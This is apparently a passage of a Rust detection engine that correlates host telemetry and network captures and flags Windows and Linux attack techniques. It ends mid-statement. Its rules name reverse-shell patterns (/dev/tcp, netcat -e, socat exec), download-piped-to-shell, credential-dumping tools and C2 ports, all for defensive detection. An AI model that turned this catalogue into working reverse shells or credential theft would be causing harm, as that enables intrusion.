#![forbid(unsafe_code)]

use chrono::{DateTime, Utc};
use core_domain::epistemic::{AssertionType, Confidence, PainLevel, Severity, VerificationState};
use core_domain::fact::{EntityType, Fact};
use core_domain::id::EntityId;
use core_domain::observation::Observation;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum CorrelationError {
    #[error("Rule evaluation failed: {0}")]
    EvaluationError(String),
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum CorrelationQuality {
    Unknown,
    Complete,
    Partial,
    Degraded,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CorrelationRule {
    pub id: String,
    pub version: String,
    pub temporal_window_seconds: i64,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CorrelationProvenance {
    pub rule_id: String,
    pub rule_version: String,
    pub temporal_window_seconds: i64,
    pub matched_host: Option<String>,
    pub matched_domain: Option<String>,
    pub source_timestamps: Vec<Option<DateTime<Utc>>>,
    pub quality: CorrelationQuality,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CorrelationResult {
    pub correlation_id: String,
    pub rule_id: String,
    pub rule_version: String,
    pub supporting_observations: Vec<String>,
    pub assertion_type: AssertionType,
    pub verification_state: VerificationState,
    pub confidence: u8,
    pub provenance: CorrelationProvenance,
}

fn evtx_pcap_rule() -> CorrelationRule {
    CorrelationRule {
        id: "CORR-H01-EVTX-PCAP".to_string(),
        version: "1".to_string(),
        temporal_window_seconds: 300,
    }
}

fn process_network_pcap_rule() -> CorrelationRule {
    CorrelationRule {
        id: "CORR-H02-PROCESS-EVTX-PCAP-ENDPOINT".to_string(),
        version: "1".to_string(),
        temporal_window_seconds: 300,
    }
}

fn canonical_json(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::Object(object) => {
            let mut fields: Vec<_> = object.iter().collect();
            fields.sort_by(|left, right| left.0.cmp(right.0));
            fields
                .into_iter()
                .map(|(key, value)| format!("{key}:{}", canonical_json(value)))
                .collect::<Vec<_>>()
                .join(",")
        }
        serde_json::Value::Array(values) => values
            .iter()
            .map(canonical_json)
            .collect::<Vec<_>>()
            .join(","),
        _ => value.to_string(),
    }
}

fn semantic_observation_id(observation: &Observation) -> String {
    let identity = format!(
        "observation-semantic-v1\0{}\0{}\0{}\0{}\0{}\0{}",
        observation.case_id,
        observation
            .artifact_id
            .map(|id| id.to_string())
            .unwrap_or_default(),
        observation.source_tool,
        observation.raw_event_type,
        observation
            .source_timestamp
            .map(|timestamp| timestamp.to_rfc3339())
            .unwrap_or_default(),
        canonical_json(&observation.data)
    );
    format!(
        "observation://{}",
        blake3::hash(identity.as_bytes()).to_hex()
    )
}

fn host_of(observation: &Observation, host_by_ip: &BTreeMap<String, String>) -> Option<String> {
    ["host", "host_ip", "computer"]
        .iter()
        .find_map(|key| observation.data.get(*key).and_then(|value| value.as_str()))
        .map(ToString::to_string)
        .or_else(|| {
            ["source_ip", "destination_ip"].iter().find_map(|key| {
                observation
                    .data
                    .get(*key)
                    .and_then(|value| value.as_str())
                    .and_then(|ip| host_by_ip.get(ip))
                    .cloned()
            })
        })
}

fn domain_of(observation: &Observation) -> Option<String> {
    ["qname", "sni", "host"]
        .iter()
        .find_map(|key| observation.data.get(*key).and_then(|value| value.as_str()))
        .map(|value| value.to_ascii_lowercase())
}

fn is_powershell(observation: &Observation) -> bool {
    ["process_name", "image", "Image", "new_process_name"]
        .iter()
        .filter_map(|key| observation.data.get(*key).and_then(|value| value.as_str()))
        .map(str::to_ascii_lowercase)
        .any(|process| process.contains("powershell") || process.ends_with("pwsh.exe"))
}

fn is_network_domain_observation(observation: &Observation) -> bool {
    matches!(
        observation.raw_event_type.as_str(),
        "dns_message" | "tls_handshake" | "http_message"
    ) && domain_of(observation).is_some()
}

fn observation_time(observation: &Observation) -> Option<DateTime<Utc>> {
    observation.source_timestamp
}

fn within_window(left: DateTime<Utc>, right: Option<DateTime<Utc>>, window_seconds: i64) -> bool {
    right
        .map(|right| (left - right).num_seconds().abs() <= window_seconds)
        .unwrap_or(false)
}

fn endpoint_value<'a>(observation: &'a Observation, key: &str) -> Option<&'a str> {
    observation.data.get(key).and_then(|value| value.as_str())
}

fn shares_endpoint(left: &Observation, right: &Observation) -> bool {
    let left_values = [
        endpoint_value(left, "source_ip"),
        endpoint_value(left, "destination_ip"),
    ];
    let right_values = [
        endpoint_value(right, "source_ip"),
        endpoint_value(right, "destination_ip"),
    ];
    left_values.into_iter().flatten().any(|left_ip| {
        right_values
            .into_iter()
            .flatten()
            .any(|right_ip| left_ip == right_ip)
    })
}

fn quality_of(observation: &Observation) -> CorrelationQuality {
    let Some(quality) = &observation.network_quality else {
        return CorrelationQuality::Unknown;
    };
    if matches!(
        quality.capture,
        core_domain::CaptureQuality::Degraded | core_domain::CaptureQuality::Failed
    ) || matches!(
        quality.protocol,
        Some(core_domain::ProtocolQuality::Degraded)
    ) {
        CorrelationQuality::Degraded
    } else if matches!(quality.capture, core_domain::CaptureQuality::Partial)
        || matches!(
            quality.flow,
            Some(core_domain::FlowQuality::Partial | core_domain::FlowQuality::Truncated)
        )
        || matches!(
            quality.protocol,
            Some(core_domain::ProtocolQuality::Partial)
        )
    {
        CorrelationQuality::Partial
    } else {
        CorrelationQuality::Complete
    }
}

fn merge_quality(left: CorrelationQuality, right: CorrelationQuality) -> CorrelationQuality {
    let rank = |quality: &CorrelationQuality| match quality {
        CorrelationQuality::Unknown => 0,
        CorrelationQuality::Complete => 1,
        CorrelationQuality::Partial => 2,
        CorrelationQuality::Degraded => 3,
    };
    if rank(&left) >= rank(&right) {
        left
    } else {
        right
    }
}

/// Stateful, deterministic Phase 4 correlation context. Each ingest call
/// updates a canonical observation set and recomputes projections from the
/// complete set, making batch boundaries semantically irrelevant.
#[derive(Debug, Default)]
pub struct CorrelationContext {
    observations: BTreeMap<String, Observation>,
}

impl CorrelationContext {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn ingest(&mut self, observations: impl IntoIterator<Item = Observation>) {
        for observation in observations {
            self.observations
                .entry(semantic_observation_id(&observation))
                .or_insert(observation);
        }
    }

    pub fn results(&self) -> Vec<CorrelationResult> {
        let observations: Vec<&Observation> = self.observations.values().collect();
        let rule = evtx_pcap_rule();
        let mut host_by_ip = BTreeMap::new();
        for observation in &observations {
            if observation.raw_event_type != "network_connection" {
                continue;
            }
            let Some(host) = observation
                .data
                .get("computer")
                .and_then(|value| value.as_str())
            else {
                continue;
            };
            for key in ["source_ip", "destination_ip"] {
                if let Some(ip) = observation.data.get(key).and_then(|value| value.as_str()) {
                    host_by_ip.insert(ip.to_string(), host.to_string());
                }
            }
        }
        let mut network_by_domain: BTreeMap<String, Vec<&Observation>> = BTreeMap::new();
        for network in observations
            .iter()
            .copied()
            .filter(|observation| is_network_domain_observation(observation))
        {
            if let Some(domain) = domain_of(network) {
                network_by_domain.entry(domain).or_default().push(network);
            }
        }
        let mut results = Vec::new();
        for process in observations
            .iter()
            .copied()
            .filter(|observation| is_powershell(observation))
        {
            for (domain, network_events) in &network_by_domain {
                let Some(process_time) = observation_time(process) else {
                    continue;
                };
                let process_host = host_of(process, &host_by_ip);
                let matching: Vec<&Observation> = network_events
                    .iter()
                    .copied()
                    .filter(|network| {
                        let Some(network_time) = observation_time(network) else {
                            return false;
                        };
                        let within_window = (process_time - network_time).num_seconds().abs()
                            <= rule.temporal_window_seconds;
                        let network_host = host_of(network, &host_by_ip);
                        within_window
                            && process_host.is_some()
                            && network_host.is_some()
                            && process_host == network_host
                    })
                    .collect();
                let dns = matching
                    .iter()
                    .copied()
                    .find(|observation| observation.raw_event_type == "dns_message");
                let tls = matching
                    .iter()
                    .copied()
                    .find(|observation| observation.raw_event_type == "tls_handshake");
                let (Some(dns), Some(tls)) = (dns, tls) else {
                    continue;
                };
                let mut supporting = vec![
                    semantic_observation_id(process),
                    semantic_observation_id(dns),
                    semantic_observation_id(tls),
                ];
                supporting.sort();
                let quality = merge_quality(
                    merge_quality(quality_of(process), quality_of(dns)),
                    quality_of(tls),
                );
                let network_host = host_of(dns, &host_by_ip).or_else(|| host_of(tls, &host_by_ip));
                let correlation_key = format!(
                    "{}\0{}\0{}\0{}",
                    rule.id,
                    rule.version,
                    process_host
                        .clone()
                        .or(network_host.clone())
                        .unwrap_or_default(),
                    domain
                );
                let correlation_id = format!(
                    "correlation://{}",
                    blake3::hash(correlation_key.as_bytes()).to_hex()
                );
                results.push(CorrelationResult {
                    correlation_id,
                    rule_id: rule.id.clone(),
                    rule_version: rule.version.clone(),
                    supporting_observations: supporting,
                    assertion_type: AssertionType::Inference,
                    verification_state: VerificationState::Candidate,
                    confidence: if quality == CorrelationQuality::Degraded {
                        50
                    } else {
                        80
                    },
                    provenance: CorrelationProvenance {
                        rule_id: rule.id.clone(),
                        rule_version: rule.version.clone(),
                        temporal_window_seconds: rule.temporal_window_seconds,
                        matched_host: process_host.or(network_host),
                        matched_domain: Some(domain.clone()),
                        source_timestamps: vec![
                            process.source_timestamp,
                            dns.source_timestamp,
                            tls.source_timestamp,
                        ],
                        quality,
                    },
                });
            }
        }

        // Sysmon Event ID 3 is an explicit host attribution boundary: it
        // carries both the computer name and the endpoint tuple. Only use a
        // PCAP observation when it shares an endpoint and falls in the same
        // temporal window; time or domain equality alone is insufficient.
        let endpoint_rule = process_network_pcap_rule();
        for process in observations
            .iter()
            .copied()
            .filter(|observation| is_powershell(observation))
        {
            let Some(process_time) = observation_time(process) else {
                continue;
            };
            let Some(process_host) = host_of(process, &host_by_ip) else {
                continue;
            };
            for connection in observations
                .iter()
                .copied()
                .filter(|observation| observation.raw_event_type == "network_connection")
            {
                let Some(connection_host) = host_of(connection, &host_by_ip) else {
                    continue;
                };
                if connection_host != process_host
                    || !is_powershell(connection)
                    || !within_window(
                        process_time,
                        observation_time(connection),
                        endpoint_rule.temporal_window_seconds,
                    )
                {
                    continue;
                }
                let Some(pcap) = observations.iter().copied().find(|observation| {
                    matches!(
                        observation.raw_event_type.as_str(),
                        "network_socket" | "network_flow"
                    ) && within_window(
                        process_time,
                        observation_time(observation),
                        endpoint_rule.temporal_window_seconds,
                    ) && shares_endpoint(connection, observation)
                }) else {
                    continue;
                };
                let mut supporting = vec![
                    semantic_observation_id(process),
                    semantic_observation_id(connection),
                    semantic_observation_id(pcap),
                ];
                supporting.sort();
                let quality = merge_quality(
                    merge_quality(quality_of(process), quality_of(connection)),
                    quality_of(pcap),
                );
                let correlation_key = format!(
                    "{}\0{}\0{}\0{}",
                    endpoint_rule.id,
                    endpoint_rule.version,
                    process_host,
                    supporting.join("\0")
                );
                let correlation_id = format!(
                    "correlation://{}",
                    blake3::hash(correlation_key.as_bytes()).to_hex()
                );
                results.push(CorrelationResult {
                    correlation_id,
                    rule_id: endpoint_rule.id.clone(),
                    rule_version: endpoint_rule.version.clone(),
                    supporting_observations: supporting,
                    assertion_type: AssertionType::Inference,
                    verification_state: VerificationState::Candidate,
                    confidence: if quality == CorrelationQuality::Degraded {
                        50
                    } else {
                        75
                    },
                    provenance: CorrelationProvenance {
                        rule_id: endpoint_rule.id.clone(),
                        rule_version: endpoint_rule.version.clone(),
                        temporal_window_seconds: endpoint_rule.temporal_window_seconds,
                        matched_host: Some(process_host.clone()),
                        matched_domain: domain_of(pcap),
                        source_timestamps: vec![
                            process.source_timestamp,
                            connection.source_timestamp,
                            pcap.source_timestamp,
                        ],
                        quality,
                    },
                });
            }
        }
        let mut unique = BTreeMap::new();
        for result in results {
            unique.insert(result.correlation_id.clone(), result);
        }
        unique.into_values().collect()
    }
}

pub fn correlate_in_batches(
    observations: &[Observation],
    batch_size: usize,
) -> Result<Vec<CorrelationResult>, CorrelationError> {
    if batch_size == 0 {
        return Err(CorrelationError::EvaluationError(
            "batch size must be positive".into(),
        ));
    }
    let mut context = CorrelationContext::new();
    for batch in observations.chunks(batch_size) {
        context.ingest(batch.iter().cloned());
    }
    Ok(context.results())
}

// ---------------------------------------------------------------------------
// Linux detection helpers (CORR-LIN-*). All checks are deterministic string
// predicates over collected telemetry; see docs/DETECTION_RULES.md.
// ---------------------------------------------------------------------------

const UNIX_SHELLS: [&str; 8] = ["sh", "bash", "dash", "zsh", "ksh", "ash", "mksh", "fish"];
const NETCAT_NAMES: [&str; 5] = ["nc", "ncat", "netcat", "nc.traditional", "nc.openbsd"];
const SCRIPT_INTERPRETERS: [&str; 6] = ["python", "perl", "ruby", "php", "node", "lua"];
/// Directories any local user can write to; legitimate software is not
/// executed from them.
const WORLD_WRITABLE_DIRS: [&str; 3] = ["/tmp/", "/var/tmp/", "/dev/shm/"];

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// A scalar observation field rendered as text ("" when absent).
fn gs_num(obs: &Observation, key: &str) -> String {
    match obs.data.get(key) {
        Some(serde_json::Value::String(s)) => s.clone(),
        Some(serde_json::Value::Number(n)) => n.to_string(),
        _ => String::new(),
    }
}

fn is_unix_shell(name: &str) -> bool {
    UNIX_SHELLS.contains(&basename(name))
}

fn is_interpreter(name: &str) -> bool {
    let base = basename(name);
    SCRIPT_INTERPRETERS.iter().any(|i| base.starts_with(i))
}

fn world_writable_prefix(path: &str) -> Option<&'static str> {
    WORLD_WRITABLE_DIRS
        .iter()
        .copied()
        .find(|dir| path.starts_with(dir))
}

/// Tokens of a shell command with quoting, grouping, pipe and redirection
/// characters removed (`2>&1|nc` -> `2`, `1`, `nc`).
fn shell_tokens(segment: &str) -> Vec<&str> {
    segment
        .split(|c: char| {
            c.is_whitespace()
                || matches!(
                    c,
                    '\'' | '"' | '(' | ')' | '`' | '{' | '}' | '|' | ';' | '&' | '<' | '>'
                )
        })
        .filter(|t| !t.is_empty())
        .collect()
}

/// The program each segment of a shell command line executes, looking
/// through common wrappers (`nohup`, `env`, `sudo`, `sh -c`, ...).
fn executed_programs(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    for segment in command.split([';', '&', '|', '\n']) {
        let tokens = shell_tokens(segment);
        let mut i = 0;
        while i < tokens.len() {
            let t = tokens[i];
            let base = basename(t);
            let is_wrapper = matches!(
                base,
                "nohup" | "setsid" | "exec" | "env" | "sudo" | "nice" | "ionice" | "stdbuf"
            ) || is_unix_shell(t)
                || t.starts_with('-')
                || (t.contains('=') && !t.starts_with('/'));
            if is_wrapper {
                i += 1;
                continue;
            }
            out.push(t.to_string());
            break;
        }
    }
    out
}

/// A command that executes something from a world-writable directory.
fn executes_from_world_writable(command: &str) -> Option<String> {
    executed_programs(command)
        .into_iter()
        .find(|p| world_writable_prefix(p).is_some())
}

/// `curl ... | sh`, `wget -O- ... | sudo bash`.
fn pipes_download_into_shell(cmd_lower: &str) -> bool {
    let segments: Vec<&str> = cmd_lower.split('|').collect();
    if segments.len() < 2 {
        return false;
    }
    let mut downloaded = false;
    for (idx, segment) in segments.iter().enumerate() {
        let tokens = shell_tokens(segment);
        if idx > 0 && downloaded {
            let first = tokens
                .iter()
                .find(|t| !matches!(basename(t), "sudo" | "env") && !t.starts_with('-'))
                .copied()
                .unwrap_or("");
            if is_unix_shell(first) || is_interpreter(first) {
                return true;
            }
        }
        if tokens
            .iter()
            .any(|t| matches!(basename(t), "curl" | "wget" | "fetch"))
        {
            downloaded = true;
        }
    }
    false
}

/// Recognizes the common reverse-shell one-liners. `actor` is the process
/// that runs the command line (its name, lowercased); when present the
/// pattern must be executed by a matching program, so e.g. `grep /dev/tcp/`
/// or an editor showing such text does not match. Commands from persistence
/// entries are checked without an actor.
fn reverse_shell_pattern(cmd_lower: &str, actor: Option<&str>) -> Option<&'static str> {
    let actor_is = |pred: &dyn Fn(&str) -> bool| actor.map(pred).unwrap_or(true);
    let tokens = shell_tokens(cmd_lower);

    if (cmd_lower.contains("/dev/tcp/") || cmd_lower.contains("/dev/udp/"))
        && actor_is(&|a: &str| is_unix_shell(a))
    {
        return Some("перенаправление оболочки в /dev/tcp");
    }

    let nc_pos = tokens
        .iter()
        .position(|t| NETCAT_NAMES.contains(&basename(t)));
    if let Some(pos) = nc_pos {
        let exec_flag = tokens[pos + 1..].iter().any(|t| {
            matches!(*t, "--exec" | "--sh-exec" | "--lua-exec")
                || (t.starts_with('-')
                    && !t.starts_with("--")
                    && (t.contains('e') || t.contains('c')))
        });
        if exec_flag && actor_is(&|a: &str| NETCAT_NAMES.contains(&basename(a)) || is_unix_shell(a))
        {
            return Some("netcat с исполнением команды (-e/-c)");
        }
        if (cmd_lower.contains("mkfifo") || cmd_lower.contains("mknod"))
            && actor_is(&|a: &str| is_unix_shell(a))
        {
            return Some("именованный канал + netcat");
        }
    }

    let interp = tokens.iter().any(|t| is_interpreter(t));
    if interp
        && (cmd_lower.contains("socket") || cmd_lower.contains("fsockopen"))
        && [
            "pty",
            "subprocess",
            "dup2",
            "/bin/sh",
            "/bin/bash",
            "exec",
            "spawn",
            "sh -i",
        ]
        .iter()
        .any(|k| cmd_lower.contains(k))
        && actor_is(&|a: &str| is_interpreter(a) || is_unix_shell(a))
    {
        return Some("однострочник интерпретатора с сокетом и оболочкой");
    }

    if tokens.iter().any(|t| basename(t) == "socat")
        && (cmd_lower.contains("exec:") || cmd_lower.contains("system:"))
        && ["tcp", "udp", "ssl", "openssl"]
            .iter()
            .any(|k| cmd_lower.contains(k))
        && actor_is(&|a: &str| basename(a) == "socat" || is_unix_shell(a))
    {
        return Some("socat с exec/system");
    }
    None
}

/// A remote address that is neither loopback nor unspecified.
fn is_external_address(addr: &str) -> bool {
    let Ok(ip) = addr.trim().parse::<std::net::IpAddr>() else {
        return false;
    };
    match ip {
        std::net::IpAddr::V4(v4) => !v4.is_loopback() && !v4.is_unspecified(),
        std::net::IpAddr::V6(v6) => {
            !v6.is_loopback()
                && !v6.is_unspecified()
                && !v6
                    .to_ipv4_mapped()
                    .is_some_and(|v4| v4.is_loopback() || v4.is_unspecified())
        }
    }
}

/// MITRE technique for a Linux persistence mechanism.
fn linux_persistence_technique(mechanism: &str) -> Option<(&'static str, &'static str)> {
    Some(match mechanism {
        "cron" | "cron_periodic" => ("T1053.003", "cron"),
        "systemd_timer" => ("T1053.006", "таймер systemd"),
        "systemd_service" | "systemd_user_service" => ("T1543.002", "служба systemd"),
        "rc_local" => ("T1037.004", "rc.local"),
        "xdg_autostart" => ("T1547.013", "XDG autostart"),
        _ => return None,
    })
}

struct Cand {
    ent_type: EntityType,
    key: String,
    fact: &'static str,
    conf: f32,
    sev: Severity,
    risk: f32,
    pain: Option<PainLevel>,
    rule: &'static str,
    tech: Option<&'static str>,
    tac: Option<&'static str>,
    desc: String,
}

impl Cand {
    #[allow(clippy::too_many_arguments)]
    fn new(
        ent_type: EntityType,
        key: String,
        fact: &'static str,
        conf: f32,
        sev: Severity,
        risk: f32,
        pain: Option<PainLevel>,
        rule: &'static str,
        tech: Option<&'static str>,
        tac: Option<&'static str>,
        desc: impl Into<String>,
    ) -> Self {
        Self {
            ent_type,
            key,
            fact,
            conf,
            sev,
            risk,
            pain,
            rule,
            tech,
            tac,
            desc: desc.into(),
        }
    }
}

pub struct DeterministicCorrelationEngine;

impl DeterministicCorrelationEngine {
    pub fn new() -> Self {
        Self
    }

    /// Evaluates observations and derives verified security facts
    pub fn correlate(&self, observations: &[Observation]) -> Result<Vec<Fact>, CorrelationError> {
        use std::collections::HashMap;

        let mut facts: Vec<Fact> = Vec::new();
        let mut fact_indices: HashMap<(EntityId, EntityType, String, String), usize> =
            HashMap::new();

        for obs in observations {
            let mut candidate_facts = Vec::new();
            let gs = |k: &str| obs.data.get(k).and_then(|v| v.as_str()).unwrap_or("");
            let host = obs
                .data
                .get("host_ip")
                .or_else(|| obs.data.get("host"))
                .and_then(|h| h.as_str())
                .unwrap_or("localhost");
            let cmd_opt = obs.data.get("command_line").and_then(|c| c.as_str());
            let proc_name = obs
                .data
                .get("process_name")
                .or_else(|| obs.data.get("name"))
                .and_then(|p| p.as_str())
                .unwrap_or("");
            let parent_name = gs("parent_name");
            let exec_path = gs("executable_path");

            let proc_lower = proc_name.to_lowercase();
            let parent_lower = parent_name.to_lowercase();
            let exec_lower = exec_path.to_lowercase();
            let is_linux = gs("platform") == "linux";
            // `-enc` is a PowerShell flag; on Linux it only means something
            // when PowerShell itself runs.
            let powershell_context =
                !is_linux || proc_lower.contains("pwsh") || proc_lower.contains("powershell");

            if let Some(cmd) = cmd_opt {
                let cmd_lower = cmd.to_lowercase();

                if cmd_lower.contains("mimikatz")
                    || cmd_lower.contains("procdump")
                    || cmd_lower.contains("comsvcs.dll")
                    || cmd_lower.contains("sekurlsa")
                {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:cred_dump", host),
                        "CredentialAccessAttempt",
                        0.95,
                        Severity::Critical,
                        95.0,
                        Some(PainLevel::Tools),
                        "CORR-WIN-001a",
                        Some("T1003.001"),
                        Some("Credential Access"),
                        "Попытка дампа учетных данных LSASS",
                    ));
                } else if cmd_lower.contains("schtasks") && cmd_lower.contains("/create") {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:persist:schtasks", host),
                        "ScheduledTaskPersistence",
                        0.85,
                        Severity::High,
                        85.0,
                        Some(PainLevel::TTPs),
                        "CORR-WIN-001b",
                        Some("T1053.005"),
                        Some("Persistence"),
                        "Создание запланированной задачи для закрепления",
                    ));
                } else if cmd_lower.contains("whoami")
                    || cmd_lower.contains("net user")
                    || cmd_lower.contains("nltest")
                {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:recon", host),
                        "DiscoveryReconnaissance",
                        0.75,
                        Severity::Medium,
                        60.0,
                        Some(PainLevel::TTPs),
                        "CORR-WIN-001c",
                        Some("T1087"),
                        Some("Discovery"),
                        "Разведка учетных записей и структуры домена",
                    ));
                } else if powershell_context
                    && (cmd_lower.contains("-enc") || cmd_lower.contains("-encodedcommand"))
                {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:obfuscated", host),
                        "ObfuscatedExecution",
                        0.85,
                        Severity::High,
                        80.0,
                        Some(PainLevel::Tools),
                        "CORR-WIN-001d",
                        Some("T1027"),
                        Some("Defense Evasion"),
                        "Запуск закодированной обфусцированной команды PowerShell",
                    ));
                }
            }

            // Parent-child anomaly (Office / Server spawning command interpreter)
            let is_office_parent = parent_lower.contains("winword")
                || parent_lower.contains("excel")
                || parent_lower.contains("powerpnt")
                || parent_lower.contains("outlook")
                || parent_lower.contains("w3wp");
            let is_shell_child = proc_lower.contains("cmd.exe")
                || proc_lower.contains("powershell.exe")
                || proc_lower.contains("pwsh.exe")
                || proc_lower.contains("wscript.exe")
                || proc_lower.contains("cscript.exe");

            if is_office_parent && is_shell_child {
                candidate_facts.push(Cand::new(
                    EntityType::Process,
                    format!("{}:proc:office_shell:{}", host, proc_name),
                    "OfficeSpawnedShell",
                    0.95,
                    Severity::Critical,
                    92.0,
                    Some(PainLevel::TTPs),
                    "CORR-WIN-001e",
                    Some("T1059.001"),
                    Some("Execution"),
                    format!(
                        "Аномальный запуск командной оболочки ({}) из офисного приложения ({})",
                        proc_name, parent_name
                    ),
                ));
            }

            // Suspicious process execution path (Temp / Public directory execution)
            if (exec_lower.contains("\\appdata\\local\\temp")
                || exec_lower.contains("\\users\\public"))
                && exec_lower.ends_with(".exe")
            {
                candidate_facts.push(Cand::new(
                    EntityType::Process,
                    format!("{}:proc:susp_path:{}", host, proc_name),
                    "SuspiciousProcessLocation",
                    0.80,
                    Severity::High,
                    75.0,
                    Some(PainLevel::HostArtifacts),
                    "CORR-WIN-001f",
                    Some("T1036.005"),
                    Some("Defense Evasion"),
                    format!(
                        "Выполнение исполняемого файла из временного/публичного каталога: {}",
                        exec_path
                    ),
                ));
            }

            // 2. Persistence correlation (CORR-WIN-002: Autoruns & Scheduled Tasks)
            let target_path = gs("target_path");
            let action_path = gs("action");
            let persist_str = format!("{} {}", target_path, action_path).to_lowercase();

            if persist_str.contains("\\appdata\\local\\temp")
                || persist_str.contains("\\users\\public")
                || (persist_str.contains("powershell") && persist_str.contains("-w hidden"))
            {
                candidate_facts.push(Cand::new(
                    EntityType::Host,
                    format!("{}:persist:suspicious", host),
                    "SuspiciousPersistenceMechanism",
                    0.90,
                    Severity::High,
                    85.0,
                    Some(PainLevel::TTPs),
                    "CORR-WIN-002",
                    Some("T1547.001"),
                    Some("Persistence"),
                    format!(
                        "Подозрительная точка закрепления (Autorun/Task) со ссылкой на: {}",
                        target_path
                    ),
                ));
            }

            // 3. Service correlation (CORR-WIN-004: Unquoted paths & suspicious binaries)
            if let Some(unquoted) = obs.data.get("unquoted_risk").and_then(|u| u.as_bool()) {
                if unquoted {
                    let srv_name = obs
                        .data
                        .get("service_name")
                        .and_then(|n| n.as_str())
                        .unwrap_or("service");
                    let bin_path = gs("binary_path");
                    candidate_facts.push(Cand::new(
                        EntityType::Host,
                        format!("{}:service:unquoted:{}", host, srv_name),
                        "UnquotedServicePath",
                        0.85,
                        Severity::Medium,
                        55.0,
                        Some(PainLevel::HostArtifacts),
                        "CORR-WIN-004",
                        Some("T1574.009"),
                        Some("Privilege Escalation"),
                        format!(
                            "Служба '{}' имеет незакавыченный путь с пробелами: {}",
                            srv_name, bin_path
                        ),
                    ));
                }
            }

            // 4. Network socket correlation (CORR-WIN-003)
            if let Some(dest_ip) = obs.data.get("destination_ip").and_then(|ip| ip.as_str()) {
                let port = obs
                    .data
                    .get("destination_port")
                    .and_then(|p| p.as_u64())
                    .unwrap_or(0);
                let is_c2 =
                    port == 4444 || port == 1337 || port == 8888 || port == 9001 || port == 5555;

                if is_c2 {
                    candidate_facts.push(Cand::new(
                        EntityType::NetworkSocket,
                        format!("{}:{}", dest_ip, port),
                        "SuspiciousC2Connection",
                        0.90,
                        Severity::Critical,
                        88.0,
                        Some(PainLevel::IpAddresses),
                        "CORR-WIN-003a",
                        Some("T1071.001"),
                        Some("Command and Control"),
                        format!(
                            "Сетевое соединение на подозрительный порт C2/реверс-шелла: {}:{}",
                            dest_ip, port
                        ),
                    ));
                } else if is_shell_child
                    && !dest_ip.starts_with("127.")
                    && !dest_ip.starts_with("0.0.")
                    && !dest_ip.is_empty()
                {
                    candidate_facts.push(Cand::new(
                        EntityType::NetworkSocket, format!("{}:{}", dest_ip, port),
                        "ShellExternalConnection", 0.95, Severity::Critical, 94.0,
                        Some(PainLevel::NetworkArtifacts), "CORR-WIN-003b", Some("T1071"),
                        Some("Command and Control"), format!("Командный интерпретатор ({}) инициировал исходящее подключение к {}:{}", proc_name, dest_ip, port),
                    ));
                }
            }

            // 5. Linux host telemetry (CORR-LIN-*)
            let actor = if proc_name.is_empty() {
                basename(exec_path).to_lowercase()
            } else {
                proc_lower.clone()
            };

            if let Some(cmd) = cmd_opt {
                let cmd_lower = cmd.to_lowercase();
                if let Some(pattern) = reverse_shell_pattern(&cmd_lower, Some(&actor)) {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:revshell:{}", host, gs_num(obs, "pid")),
                        "ReverseShellCommandLine",
                        0.95,
                        Severity::Critical,
                        95.0,
                        Some(PainLevel::TTPs),
                        "CORR-LIN-001a",
                        Some("T1059.004"),
                        Some("Execution"),
                        format!(
                            "Командная строка реверс-шелла ({}) в процессе {}: {}",
                            pattern, proc_name, cmd
                        ),
                    ));
                } else if is_unix_shell(&actor) && pipes_download_into_shell(&cmd_lower) {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:download_exec:{}", host, gs_num(obs, "pid")),
                        "DownloadPipedToShell",
                        0.85,
                        Severity::High,
                        80.0,
                        Some(PainLevel::Tools),
                        "CORR-LIN-001d",
                        Some("T1105"),
                        Some("Command and Control"),
                        format!(
                            "Загрузка и немедленное исполнение кода через конвейер в оболочку: {}",
                            cmd
                        ),
                    ));
                }
            }

            if let Some(dir) = world_writable_prefix(exec_path) {
                candidate_facts.push(Cand::new(
                    EntityType::Process,
                    format!("{}:proc:ww_exec:{}", host, exec_path),
                    "ProcessFromWorldWritableDir",
                    0.80,
                    Severity::High,
                    75.0,
                    Some(PainLevel::HostArtifacts),
                    "CORR-LIN-001b",
                    Some("T1036.005"),
                    Some("Defense Evasion"),
                    format!(
                        "Процесс {} запущен из общедоступного для записи каталога {}: {}",
                        proc_name, dir, exec_path
                    ),
                ));
            }

            if obs.data.get("exe_deleted").and_then(|v| v.as_bool()) == Some(true) {
                if exec_path.starts_with("/memfd:") {
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:memfd:{}", host, exec_path),
                        "FilelessMemfdExecution",
                        0.85,
                        Severity::High,
                        80.0,
                        Some(PainLevel::TTPs),
                        "CORR-LIN-001e",
                        Some("T1620"),
                        Some("Defense Evasion"),
                        format!(
                            "Бесфайловое исполнение из анонимной памяти (memfd) процессом {} (PID {}): {}",
                            proc_name,
                            gs_num(obs, "pid"),
                            exec_path
                        ),
                    ));
                } else {
                    // Package upgrades also leave running daemons with a
                    // deleted image until they are restarted; that case is
                    // graded lower but still reported.
                    let packaged = ["/usr/", "/bin/", "/sbin/", "/lib", "/opt/"]
                        .iter()
                        .any(|p| exec_path.starts_with(p));
                    let (sev, risk) = if packaged {
                        (Severity::Medium, 45.0)
                    } else {
                        (Severity::High, 80.0)
                    };
                    candidate_facts.push(Cand::new(
                        EntityType::Process,
                        format!("{}:proc:deleted_exe:{}", host, exec_path),
                        "DeletedExecutableRunning",
                        0.80,
                        sev,
                        risk,
                        Some(PainLevel::HostArtifacts),
                        "CORR-LIN-001c",
                        Some("T1070.004"),
                        Some("Defense Evasion"),
                        format!(
                            "Исполняемый файл работающего процесса {} (PID {}) удалён с диска: {}",
